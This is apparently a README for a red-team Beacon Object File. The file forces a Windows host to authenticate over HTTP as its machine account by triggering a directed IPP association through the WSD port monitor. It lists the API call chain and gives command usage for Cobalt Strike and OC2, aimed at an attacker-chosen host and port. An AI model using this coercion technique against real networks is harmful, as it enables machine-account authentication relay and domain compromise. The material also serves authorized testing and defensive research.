# IPP Coercion BOF

A Beacon Object File (BOF) that forces a Windows machine to authenticate over HTTP as its computer account (`HOSTNAME$`), by triggering a directed IPP association through the WSD port monitor. This technique allows operators to coerce and relay machine-account authentication over HTTP. 

Tested on **Windows 11 26H2**.

<img width="2076" height="802" alt="img-3" src="https://github.com/user-attachments/assets/4974feec-a093-4ef9-a0f1-2054dbcf1ec6" />


## How It Works

The BOF was produced by tracing `printui.exe` during an IPP printer add, and reducing it to the observed set of API calls (using Claude Opus 5.5, Frida, and ETW). At a high-level, this BOF does the following:

1. Opens a config handle to the WSD port monitor (`OpenPrinterW(",XcvMonitor WSD Port")`)
2. Calls `AssocIppDirected` with the supplied URI (`XcvDataW`)
3. Causes the spooler to trigger `DeviceAssociationService` via RPC and perform the outbound connection

## Usage

### Cobalt Strike

Load `coerce-ipp.cna` in Cobalt Strike.

```text
beacon> coerce-ipp <ip> <port>
beacon> coerce-ipp 127.0.0.1 8082
```

### OC2v2

The `oc2_v2/coerce_ipp_bof.s1.py` adapter provides the command for OC2v2/Stage1
API. Put the complete `BOF-coerce-ipp` folder in the Stage1 BOF path.

```text
coerce-ipp <host> <port>
coerce-ipp 127.0.0.1 8082
```

### OC2v3

The `oc2/` directory contains an OC2v3 command provider targeting API and SDK
version `3.0.0-rc.2`.

```text
coerce-ipp <host> <port>
coerce-ipp 127.0.0.1 8082
```

#### Self-hosted

Install `uv`, then copy `oc2/.env.example` to `oc2/.env` and configure the
server URL and bootstrap token. Start the provider from `oc2/` with
`uv run --locked coerce_ipp.py`; `uv` provisions the pinned Python runtime and
dependencies from the lockfile.

#### ZIP upload

Install the `zip` command, then run the packaging script from anywhere:

```sh
./oc2/create_zip.sh
```

This creates `BOF-coerce-ipp-flat.zip` in the current working directory. The
archive contains the OC2v3 provider and its prebuilt BOFs. Upload the ZIP to
OC2v3.

## References

- [Microsoft Learn: MS-RPRN](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/) - AssocIppDirected (APMON XcvData) specification
- [Microsoft Learn: Add-Printer](https://learn.microsoft.com/en-us/powershell/module/printmanagement/add-printer) - Directed IPP discovery
